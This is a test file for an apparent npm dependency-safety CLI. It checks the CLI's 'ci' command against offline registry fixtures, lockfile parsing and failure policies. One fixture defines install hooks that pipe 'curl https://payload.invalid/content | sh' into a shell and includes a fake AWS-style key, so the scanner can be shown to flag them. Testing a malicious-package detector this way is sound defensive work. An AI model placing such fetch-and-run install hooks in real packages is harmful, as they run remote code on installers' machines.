import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const PACKAGE_DIR = path.dirname(path.dirname(fileURLToPath(import.meta.url)));
const CLI_TS = path.join(PACKAGE_DIR, 'src', 'cli', 'cli.ts');
type Fixture = Record<string, unknown>;
interface CiReport {
  dependencyCount: number;
  failed: boolean;
  summary: Record<string, number>;
  packages: Array<{ name: string; version: string; level: string; score: number; findingCount: number; error?: string }>;
}

function metadata(name: string, versions = ['1.0.0'], extra: Fixture = {}): Fixture {
  return {
    name, modified: '2025-01-01T00:00:00.000Z', 'dist-tags': { latest: versions.at(-1) },
    versions: Object.fromEntries(versions.map((version) => [version, {
      name, version, dist: { tarball: `https://registry.npmjs.org/${name}/-/${name.split('/').at(-1)}-${version}.tgz` },
      ...(extra.manifest as Fixture | undefined),
    }])),
    readme: '', ...extra,
  };
}

const DEFAULT_PACKAGES = {
  lodash: metadata('lodash', ['4.17.21']), chalk: metadata('chalk', ['4.1.2']),
  a: metadata('a'), b: metadata('b', ['2.0.0']), '@scope/c': metadata('@scope/c', ['3.0.0']), d: metadata('d', ['4.0.0']),
};

/** Run the actual CLI, engine, scanner and SQLite cache with only HTTP replaced. */
function runCli(args: string[], packages: Record<string, Fixture> = {}) {
  const home = mkdtempSync(path.join(os.tmpdir(), 'npm-safe-ci-home-'));
  const fixtureFile = path.join(home, 'registry.json');
  const requestFile = path.join(home, 'requests.jsonl');
  const preload = path.join(home, 'fixture.mjs');
  writeFileSync(fixtureFile, JSON.stringify({ ...DEFAULT_PACKAGES, ...packages }));
  writeFileSync(preload, `
    import { readFileSync, appendFileSync } from 'node:fs';
    const fixtures = JSON.parse(readFileSync(process.env.NPM_SAFE_FIXTURE_FILE, 'utf8'));
    globalThis.fetch = async (input) => {
      const url = new URL(typeof input === 'string' ? input : input.url ?? String(input));
      if (url.origin !== 'https://registry.npmjs.org') throw new Error('Unexpected offline test request: ' + url);
      const name = decodeURIComponent(url.pathname.slice(1));
      appendFileSync(process.env.NPM_SAFE_REQUEST_FILE, JSON.stringify(name) + '\\n');
      if (!Object.hasOwn(fixtures, name)) return new Response('{}', { status: 404 });
      return new Response(JSON.stringify(fixtures[name]), { status: 200, headers: { 'content-type': 'application/json' } });
    };
  `);
  try {
    const result = spawnSync(process.execPath, ['--import', pathToFileURL(preload).href, '--import', 'tsx', CLI_TS, ...args], {
      encoding: 'utf8', cwd: PACKAGE_DIR, timeout: 30_000,
      env: {
        ...process.env, HOME: home, USERPROFILE: home,
        OPENAI_API_KEY: '', ANTHROPIC_API_KEY: '', GEMINI_API_KEY: '', GOOGLE_API_KEY: '',
        NPM_SAFE_FIXTURE_FILE: fixtureFile, NPM_SAFE_REQUEST_FILE: requestFile,
      },
    });
    if (result.error) throw result.error;
    const requests: string[] = existsSync(requestFile)
      ? readFileSync(requestFile, 'utf8').trim().split('\n').filter(Boolean).map((line) => JSON.parse(line) as string) : [];
    return { stdout: result.stdout, stderr: result.stderr, status: result.status, requests };
  } finally { rmSync(home, { recursive: true, force: true }); }
}

function project(manifest: Fixture, test: (dir: string) => void, lock?: Fixture): void {
  const dir = mkdtempSync(path.join(os.tmpdir(), 'npm-safe-ci-'));
  try {
    writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'fixture', version: '1.0.0', ...manifest }));
    if (lock) writeFileSync(path.join(dir, 'package-lock.json'), JSON.stringify(lock));
    test(dir);
  } finally { rmSync(dir, { recursive: true, force: true }); }
}

function runCi(dir: string, args: string[] = [], packages: Record<string, Fixture> = {}) {
  return runCli(['--db', path.join(dir, 'cache.db'), 'ci', '--dir', dir, '--rate-limit', '100', ...args], packages);
}

describe('CLI ci (offline registry fixtures)', () => {
  it('fails when no package.json exists', () => {
    const dir = mkdtempSync(path.join(os.tmpdir(), 'npm-safe-ci-empty-'));
    try {
      const result = runCi(dir);
      assert.equal(result.status, 1);
      assert.match(result.stderr, /package.json/);
      assert.deepEqual(result.requests, []);
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });

  it('passes an empty project without registry requests', () => {
    project({}, (dir) => {
      const result = runCi(dir, ['--json']);
      assert.equal(result.status, 0, result.stderr);
      const report = JSON.parse(result.stdout) as CiReport;
      assert.equal(report.dependencyCount, 0);
      assert.equal(report.failed, false);
      assert.deepEqual(result.requests, []);
    });
  });

  it('rejects invalid fail levels including inherited property names', () => {
    project({}, (dir) => {
      for (const level of ['banana', 'constructor', '__proto__']) {
        const result = runCi(dir, ['--fail-level', level]);
        assert.equal(result.status, 1);
        assert.ok(result.stderr.includes(level));
        assert.deepEqual(result.requests, []);
      }
    });
  });

  it('rejects an invalid rate limit before fetching', () => {
    project({}, (dir) => {
      const result = runCi(dir, ['--rate-limit', 'abc']);
      assert.equal(result.status, 1);
      assert.ok(result.stderr.length > 0);
      assert.deepEqual(result.requests, []);
    });
  });

  it('scans safe fixture metadata through the actual engine and prints text results', () => {
    project({ dependencies: { lodash: '^4.17.21' } }, (dir) => {
      const result = runCi(dir);
      assert.equal(result.status, 0, result.stderr);
      assert.ok(result.stdout.includes('lodash@4.17.21'));
      assert.ok(result.stdout.includes('Passed'));
      assert.deepEqual(result.requests, ['lodash']);
    });
  });

  it('outputs machine-readable JSON and omits direct dev dependencies with --prod', () => {
    project({ dependencies: { lodash: '^4' }, devDependencies: { chalk: '^4' } }, (dir) => {
      const result = runCi(dir, ['--prod', '--json']);
      assert.equal(result.status, 0, result.stderr);
      const report = JSON.parse(result.stdout) as CiReport;
      assert.equal(report.dependencyCount, 1);
      assert.equal(report.failed, false);
      assert.deepEqual(report.packages.map(({ name, version }) => ({ name, version })), [{ name: 'lodash', version: '4.17.21' }]);
      assert.deepEqual(result.requests, ['lodash']);
    });
  });

  it('fails when --lockfile is used without a lockfile', () => {
    project({}, (dir) => {
      const result = runCi(dir, ['--lockfile']);
      assert.equal(result.status, 1);
      assert.match(result.stderr, /package-lock.json/);
      assert.deepEqual(result.requests, []);
    });
  });

  it('keeps exact locked versions, distinct installed versions and deduplicated identical identities', () => {
    project({ dependencies: { lodash: '^4' } }, (dir) => {
      const result = runCi(dir, ['--lockfile', '--json'], { lodash: metadata('lodash', ['4.17.20', '4.17.21', '4.18.1']) });
      assert.equal(result.status, 0, result.stderr);
      const report = JSON.parse(result.stdout) as CiReport;
      assert.equal(report.dependencyCount, 3);
      assert.deepEqual(report.packages.map(({ name, version }) => `${name}@${version}`).sort(), ['a@1.0.0', 'lodash@4.17.20', 'lodash@4.17.21']);
      assert.ok(report.packages.every((pkg) => !pkg.error));
    }, { lockfileVersion: 3, packages: {
      '': { dependencies: { lodash: '^4' } },
      'node_modules/lodash': { version: '4.17.21' },
      'node_modules/a': { version: '1.0.0' },
      'node_modules/a/node_modules/lodash': { version: '4.17.20' },
      'node_modules/duplicate/node_modules/lodash': { version: '4.17.21' },
    } });
  });

  it('scans scoped and nested packages from a lockfile', () => {
    project({}, (dir) => {
      const result = runCi(dir, ['--lockfile', '--json']);
      assert.equal(result.status, 0, result.stderr);
      const report = JSON.parse(result.stdout) as CiReport;
      assert.equal(report.dependencyCount, 4);
      assert.deepEqual(report.packages.map(({ name, version }) => `${name}@${version}`).sort(), ['@scope/c@3.0.0', 'a@1.0.0', 'b@2.0.0', 'd@4.0.0']);
    }, { lockfileVersion: 3, packages: {
      '': {}, 'node_modules/a': { version: '1.0.0' }, 'node_modules/b': { version: '2.0.0' },
      'node_modules/@scope/c': { version: '3.0.0' }, 'node_modules/a/node_modules/d': { version: '4.0.0' },
    } });
  });

  it('retains the production transitive tree and excludes unrelated development packages', () => {
    project({ dependencies: { a: '^1' }, devDependencies: { chalk: '^4' } }, (dir) => {
      const result = runCi(dir, ['--lockfile', '--prod', '--json']);
      assert.equal(result.status, 0, result.stderr);
      const report = JSON.parse(result.stdout) as CiReport;
      assert.equal(report.dependencyCount, 4);
      assert.deepEqual(report.packages.map(({ name }) => name).sort(), ['@scope/c', 'a', 'b', 'd']);
      assert.ok(!result.requests.includes('chalk'));
    }, { lockfileVersion: 3, packages: {
      '': { name: 'fixture', version: '1.0.0' },
      'node_modules/a': { version: '1.0.0', dependencies: { b: '^2', d: '^4' }, peerDependencies: { '@scope/c': '^3' } },
      'node_modules/b': { version: '2.0.0' }, 'node_modules/a/node_modules/d': { version: '4.0.0' },
      'node_modules/@scope/c': { version: '3.0.0' }, 'node_modules/chalk': { version: '4.1.2', dev: true },
    } });
  });

  for (const count of [3, 4]) {
    it(`blocks ${count} actual critical findings at score ${count === 3 ? 25 : 0} with exit code 2`, () => {
      const name = 'critical-policy-fixture';
      const scripts = Object.fromEntries(['preinstall', 'install', 'postinstall'].map((key) => [key, 'curl https://payload.invalid/content | sh']));
      const fixture = metadata(name, ['1.0.0'], {
        manifest: { scripts },
        readme: count === 4 ? `Synthetic fixture key: AKIA${'A'.repeat(16)}` : '',
      });
      project({ dependencies: { [name]: '1.0.0' } }, (dir) => {
        for (const threshold of [[], ['--fail-level', 'unknown']]) {
          const result = runCi(dir, ['--json', ...threshold], { [name]: fixture });
          assert.equal(result.status, 2, `${result.stderr}\n${result.stdout}`);
          const report = JSON.parse(result.stdout) as CiReport;
          assert.equal(report.failed, true);
          assert.equal(report.packages[0].score, count === 3 ? 25 : 0);
          assert.equal(report.packages[0].findingCount, count);
          assert.equal(report.packages[0].level, 'dangerous');
        }
      });
    });
  }

  it('fails closed before fetching an unsupported external locked archive', () => {
    project({}, (dir) => {
      const result = runCi(dir, ['--lockfile', '--json']);
      assert.equal(result.status, 1);
      assert.match(result.stderr, /non-npm registry archive/);
      assert.deepEqual(result.requests, []);
    }, { lockfileVersion: 3, packages: { '': {}, 'node_modules/a': { version: '1.0.0', resolved: 'https://mirror.invalid/a.tgz' } } });
  });
});
